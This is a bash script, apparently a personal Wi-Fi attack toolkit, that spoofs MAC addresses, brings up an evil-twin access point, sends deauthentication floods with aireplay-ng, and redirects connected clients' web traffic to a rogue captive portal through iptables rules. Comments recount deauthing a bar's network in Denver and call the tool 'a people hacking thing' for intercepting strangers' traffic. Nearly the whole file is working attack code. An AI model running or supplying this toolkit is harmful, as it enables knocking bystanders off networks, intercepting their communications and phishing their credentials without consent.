#!/bin/bash
# For use with an external Wifi dongle such as an Alfa AWUS036H

OPTION=$1
HOME_PATH=/home/dj
CONFIG=$HOME_PATH/Tools/wiTk/configs/wiTk.conf
WPA_CONF=$HOME_PATH/Tools/wiTk/configs/wpa_supplicant.conf

source $HOME_PATH/.bash_colors

###
# Add options for:
# adhoc
# dump -> starts up an airodump-ng (or bettercap) instance on $mon_if
# deauth -> to deauth all clients on $inet_if
# capture -> starts up bettercap using the sniff.cap (or whatever I call it) caplet and $ap_if interface
# 
# Also, add an argument to portal to kill the portal (remove those lines from iptables)
# ...
###

function helpText() {
        echo "Usage:"
        echo -e "\tkill\t\t\tKill all network processes"
        echo -e "\tconnect\t\t\tConnect to an access point based on the config file"
        echo -e "\treconnect\t\tReconnect to an access point based on the wpa_supplicant"
        echo -e "\teviltwin\t\tStart the Eviltwin Access point"
        echo -e "\tflush\t\tFlush all iptables rules"
        echo -e "\tdeauth <number>\t\tSend X amount of deauths to the client network"
        echo -e "\tportal\t\t\tSpin up a Captive Portal with a predefined page"
        echo -e "\tmonitor <iface>\t\tSet an external WiFi dongle to monitor mode"
        echo -e "\tgui\t\tRun regular network utilities such as NetworkManager"
        echo -e "\thelp\t\t\tPrint this help text"

        exit 1
}

# Make sure you specify at least one command
if [ -z "$1" ]; then
	helpText
fi

# parse the wiTk configuration file
ap_if=$(cat $CONFIG|grep ap_if |cut -d= -f2)
ap_ssid=$(cat $CONFIG|grep ap_ssid |cut -d= -f2)
ap_psk=$(cat $CONFIG|grep ap_psk |cut -d= -f2)
ap_ip=$(cat $CONFIG|grep ap_ip |cut -d= -f2)
ap_net=$(cat $CONFIG|grep ap_net |cut -d= -f2)
hostapd_conf=$(cat $CONFIG|grep hostapd_conf |cut -d= -f2)
dnsmasq_conf=$(cat $CONFIG|grep dnsmasq_conf |cut -d= -f2)
inet_if=$(cat $CONFIG|grep inet_if |cut -d= -f2)
inet_ssid=$(cat $CONFIG|grep inet_ssid |cut -d= -f2)
inet_psk=$(cat $CONFIG|grep inet_psk |cut -d= -f2)
inet_bssid=$(cat $CONFIG|grep inet_bssid |cut -d= -f2)
mon_if=$(cat $CONFIG|grep mon_if |cut -d= -f2)
tpl=$(cat $CONFIG|grep tpl| cut -d= -f2)

# Can only be run as root
function checkRoot() {
	if [ $EUID -ne 0 ]; then
		echo -e "[${RED}!${OFF}] You must be root to run this program!"
		exit 1
	fi
}

function macSpoof() {
	vendor=$(sort -R $HOME_PATH/Tools/wordlists/Miscellaneous/macPrefixes.txt|head -n1)
	suffix=$(hexdump -n3 -e '/1 ":%02X"' /dev/urandom)
	randMac=$vendor$suffix

	ip link set $1 down
	ip link set dev $1 address $randMac
	ip link set $1 up
}

# killall
function killAll() {
	airmon-ng check kill
	dhclient -r 2>/dev/null
	killall hostapd 2>/dev/null
	killall dnsmasq 2>/dev/null
	systemctl stop systemd-resolved
}

#
## Connect to the internet based on the fields specified in the configuration file. Requires: 
## inet_if, inet_ssid, inet_bssid, inet_psk
#
function getUplink() {
	macSpoof $inet_if
	wpa_passphrase $inet_ssid $inet_psk > $WPA_CONF
	sed -i "3ibssid=$inet_bssid" $WPA_CONF
	wpa_supplicant -B -i $inet_if -c $WPA_CONF
	dhclient $inet_if
	systemctl restart systemd-resolved
}

#
## Quickly reconnect, killing previous processes. Requires: inet_if, inet_ssid, inet_bssid, inet_psk
#
function reConnect() {
	killall wpa_supplicant
	dhclient -r
	getUplink
}

function runGui() {
	killAll
	systemctl start systemd-resolved
	systemctl start network-manager
}

#
## Set a WiFi dongle into monitor mode requires: mon_if
#
function startMon() {
	# spawn a monitor interface. You only need this if you want to deauth people and force them to connect to you
	ip link set $ap_if up
	ifconfig |grep $ap_if &>/dev/null

	if [ "$?" -eq 1 ]; then
		echo -e "[${YELLOW}!${OFF}] Interface $ap_if doesn't exist! Did you plug it in?"
		exit 1
	fi

	ifconfig |grep $mon_if &>/dev/null

	# Make sure it doesn't exist already
	if [ "$?" -eq 0 ]; then
		echo -e "[${YELLOW}!${OFF}] Interface $mon_if already exists!"
	else
		echo -e "[${BLUE}+${OFF}] Initializing the monitor interface"
		macSpoof $ap_if
		iw dev $ap_if interface add $mon_if type monitor
		ip link set $mon_if up 2>/dev/null
	fi
}

#
## Start up the evil access point. Requires: ap_if, ap_ssid, ap_psk, ap_ip, ap_net
#
function startEvilAp() {
	ifconfig -a|grep $ap_if &>/dev/null

	# Make sure the interface is plugged in
	if [ "$?" -eq 1 ]; then
		echo -e "[${YELLOW}!${OFF}] Interface $ap_if doesn't exist! Did you plug it in?"
		exit 1
	fi

	echo -e "[${BLUE}+${OFF}] Configuring access point"
	ip link set $ap_if up
	ifconfig $ap_if $ap_ip netmask 255.255.255.0
	route add -net $ap_net netmask 255.255.255.0 gw $ap_ip

	echo -e "[${BLUE}+${OFF}] Constructing the bridge between the AP and the uplink"
	iptables -F
	iptables -X
	iptables -t nat -F
	iptables -t nat -X
	iptables -A FORWARD -i $ap_if -o $inet_if -j ACCEPT
	iptables -A FORWARD -i $inet_if -o $ap_if -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
	iptables -t nat -A POSTROUTING -o $inet_if -j MASQUERADE

	# kill previous dns
	echo -e "[${BLUE}+${OFF}] Killing any current DNS processes"
	sudo systemctl stop systemd-resolved

	echo -e "[${BLUE}+${OFF}] Starting the DHCP server"
	hostapd -B $hostapd_conf
	dnsmasq -C $dnsmasq_conf
}

function flushIptables() {
	iptables -F
	iptables -X
	iptables -t nat -F
	iptables -t nat -X
	iptables -t mangle -F
	iptables -t mangle -X internet
}

## Soooo this needs some work. Until recently I've only attempted this at my home network 
## and I forgot that the way I'm deauthing is actually going directly to the router, not clients
## So while I was at this bar in Denver I tried this and heard the jukebox announce to the whole bar: 
## "You've been disconnected from the internet. Oops. It reconnected swiftly
## and no one knew it was me but there's always the possibility of someone noticing my antenna and piecing it together. 
## In pretty much every IRL situation it isn't a good idea to do it this way. So don't.
## However maybe you could add some code which uses airodump or something to gather multiple client MAC addresses and then 
## deauth each of them in individual threads. Idk. Realistically why would you want to just spam the network and 
## decrypt a bunch of random people's comms anyway? I guess if you were trying to gain access to the WiFi network or you were in a corporate
## setting where you just need one person to fuck up, but if you were in a corporate setting you absolutely wouldn't even be doing it this way
## This is more of a people hacking thing then a company hacking thing. 
function deauthClients() {
	which aireplay-ng &>/dev/null

	if [ "$?" -eq 1 ]; then
		echo -e "[${YELLOW}!${OFF}] You must install the Aircrack suite for this to work. Try apt install aircrack-ng"
		exit 1
	fi
	aireplay-ng --deauth $1 -a $inet_bssid $mon_if --ignore-negative-one
}

#
## Starts apache2 and appends a few IPtables rules to redirect all clients to your custom portal
## I noticed that this won't redirect clients who have already connected. 
## If they've connected previously they will still freely browser the internet
## Consider adding a deauth here (you want to implement a deauth module anyway
#
function captivePortal() {
	which apache2 

	if [ "$?" -eq 1 ]; then
		echo -e "[${YELLOW}!${OFF}] You must have Apache installed for this to work. Try apt install apache2"
		exit 1
	fi

	iptables -t mangle -N internet
	iptables -t mangle -A PREROUTING -i $ap_if -p tcp -m tcp --match multiport --dports 80,443 -j internet
	iptables -t mangle -A internet -j MARK --set-mark 99
	iptables -t nat -A PREROUTING -i $ap_if -p tcp -m mark --mark 99 -m tcp --match multiport --dports 80,443 -j DNAT --to-destination $ap_ip

	systemctl restart apache2

	if [ "$?" -eq 0 ]; then
		echo -e "[${BLUE}+${OFF}] Captive Portal now running at $ap_if/index.html"
	fi
}

case $OPTION in
	kill)
		checkRoot
		killAll
		exit 0
		;;
	connect)
		checkRoot
		getUplink
		exit 0
		;;
	reconnect)
		checkRoot
		reConnect
		exit 0
		;;
	eviltwin)
		checkRoot
		startEvilAp
		exit 0
		;;
	deauth)
		checkRoot
		deauthClients $2
		exit 0
		;;
	portal)
		checkRoot
		captivePortal
		exit 0
		;;
	flush)
		checkRoot
		flushIptables
		exit 0
		;;
	macspoof)
		checkRoot
		macSpoof $2
		exit 0
		;;
	monitor)
		checkRoot
		startMon
		exit 0
		;;
	gui)
		checkRoot
		runGui
		exit 0
		;;
	help)
		helpText
		exit 1
		;;
esac
